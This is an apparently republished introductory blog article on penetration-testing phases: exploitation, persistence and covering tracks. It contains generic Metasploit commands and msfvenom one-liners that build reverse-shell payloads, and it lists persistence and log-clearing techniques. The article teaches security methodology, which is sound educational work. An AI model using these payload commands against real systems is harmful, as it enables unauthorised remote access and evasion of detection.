---
{"dg-publish":true,"permalink":"/01-consume/articles/thinking-like-a-hacker-part-2/","title":"Thinking Like A Hacker — Part 2","tags":["hacker","ethical-hacker"]}
---


# Thinking Like A Hacker — Part 2

## Key Points:
The Ethical Hacker Methodology

When people think about hacking, they usually imagine someone frantically typing at a keyboard, green text flying across the screen (no thanks to Hollywood movies). The reality is far more methodical and complex, and … slow. I began this train of thought in part 1: [https://medium.com/@iamblacklight/thinking-like-a-hacker-part-1-2548de8656f7](https://medium.com/@iamblacklight/thinking-like-a-hacker-part-1-2548de8656f7)

## Let’s continue our dive — R.S.E.M.C

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*hzFJZvrGG0dEJ9u5lmMIPA.jpeg)

[Unsplash](https://unsplash.com/photos/an-abstract-image-of-a-sphere-with-dots-and-lines-nGoCBxiaRO0)

3. **Exploitation / Gaining Access**

If we use the analogy of breaking into a house, one might look for unlocked windows, loose door frames, or ways to pick the lock — you’re searching for a vulnerability to exploit. This is where the work put into enumeration pays off.

Hackers have several “lockpicking” methods (known as attack vectors), some examples:

- Finding systems with default passwords (called credential stuffing)
- Breaking weak passwords (known as brute forcing)
- Exploiting software vulnerabilities
- Manipulating users into giving away their passwords (termed social engineering)

Generally, we can categorize exploitation into manual and automated exploitation.

> Automated exploitation relies on automated tools to identify and exploit vulnerabilities. These tools are designed to scan systems, detect weaknesses, and execute predefined exploits with minimal human intervention. Automated exploitation is noisy (too many indicators of malicious activity happening), it’s mostly followed when stealth/evasion is not a priority.
> 
> Manual exploitation involves a penetration tester identifying vulnerabilities and crafting custom exploits to take advantage of them. It is best for targeted assessments, such as red team engagements or testing critical systems (imagine testing a hospital system and accidentally shutting down life support). It’s more suitable for large-scale vulnerability assessments or routine security checks.

A very common exploitation framework is **Metasploit** by Rapid7**.** It comes natively with Kali Linux.

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*KUCqvV5ueYObcuJ2GxrYaQ.png)

Think of Metasploit as the Swiss Army knife of penetration testing. At its core, Metasploit is a collection of tested, ready-to-use tools that security professionals use for penetration testing.

The Core Components:

- **MSFconsole:** This is the main interface where you launch exploits, manage sessions, handle listeners, coordinate your pentesting. Here are some common commands:
```c
search [vulnerability]  # Find relevant exploits
use [exploit path]     # Select an exploit to use
set PAYLOAD [payload]  # Choose what happens after exploitation
set RHOST [IP]        # Set the target
exploit               # Launch the attack
```
- **MSFvenom:** This is the payload generator. With MSFvenom, you can create standalone executables, generate shellcode, craft custom backdoors, build encoded payloads to evade detection. Some common commands:
```c
# Generate a Windows executable payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f exe > payload.exe

# Create a Python-based payload
msfvenom -p python/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -f raw > payload.py

# Generate a PHP web payload
msfvenom -p php/reverse_php LHOST=[IP] LPORT=[PORT] -f raw > shell.php
```
- **Meterpreter:** This is the advanced payload that gives you extensive control after exploitation. Every pentester is happy with a successfully spawned meterpreter shell.
- **Auxilary Modules:** These are for reconnaisance.
- **Post-Exploitation Modules:** After gaining access, these modules help with privilege escalation, persistence establishment (more on this soon).

You can read the full documentation here: [https://www.kali.org/tools/metasploit-framework/](https://www.kali.org/tools/metasploit-framework/)

> One thing to note: Never completely rely on a tool, always validate.

4. **Maintaining Access / Persistence**

The first step to post-exploitation is to establish persistence. Persistence refers to the methods attackers use to ensure they can regain access to a compromised system after the initial exploit. This involves creating backdoors, modifying system configurations, or installing malicious software that allows continued access even if the initial entry point is closed/unavailable. This phase is essential for simulating real-world attack scenarios, where attackers aim to maintain long-term access to compromised systems for further exploitation, data exfiltration, or lateral movement.

Here are some example techniques in Windows & Linux environments:

**Windows Persistence Techniques**

- Registry modifications — Adding malicious entries to the Windows Registry to execute payloads at startup.
- Scheduled tasks — Creating scheduled tasks to execute malicious payloads at specific intervals or during system startup.
- DLL hijacking — Replacing legitimate Dynamic Link Libraries (DLLs) with malicious ones to execute code when the application loads the DLL.

Linux Persistence Techniques

- Cron jobs — Adding malicious commands or scripts to cron jobs to execute them at regular intervals or during system startup.
- Systemd service — Creating a custom systemd service to execute a payload at startup.

5. **Covering Tracks**

Covering tracks is the final phase of a penetration test, where the penetration tester aims to remove evidence of their activities to avoid detection. This phase is crucial for maintaining stealth and ensuring that the target remains unaware of the infiltration.

A small caveat here:

> Penetration testing and red teaming are similar but they serve different purposes and involve distinct methodologies. Penetration testing is a focused, goal-oriented assessment designed to identify and exploit vulnerabilities in a specific system, application, or network.
> 
> Red teaming is a broader, adversarial simulation exercise where a team of security professionals (the red team) mimics real-world attackers to test an organization’s detection and response capabilities.

Covering of tracks mainly applies to red teaming engagements. Some common techniques for covering tracks include; clearing logs, removing files/artifacts, timestomping (modifying the timestamps of files to make them appear unchanged or to hide when they were created or modified).

Understanding the five stages of hacking — reconnaissance, scanning & enumeration, exploitation, maintaining access, and covering tracks — is essential for ethical hackers. These stages not only mirror the tactics used by malicious attackers but also provide a structured methodology for simulating real-world threats in a controlled and ethical manner.

Penetration testing should be part of a plan for continuous improvement of an organization’s cyberposture. This approach enables organizations to strengthen their defenses, prioritize remediation efforts, and gradually reduce the surface area for malicious hackers.

I demystify cybersecurity through documenting my journey, accessible content, sharing advice, and discussions. Building a community for a secure digital future.

## More from iamblacklight

## Recommended from Medium

[

See more recommendations

](https://medium.com/?source=post_page---read_next_recirc--43d2e4639e28---------------------------------------)

## Summary:
When people think about hacking, they usually imagine someone frantically typing at a keyboard, green text flying across the screen (no thanks to Hollywood movies). The reality is far more methodical…

---

*Source: [Thinking Like A Hacker — Part 2](https://medium.com/@iamblacklight/thinking-like-a-hacker-part-2-43d2e4639e28)*
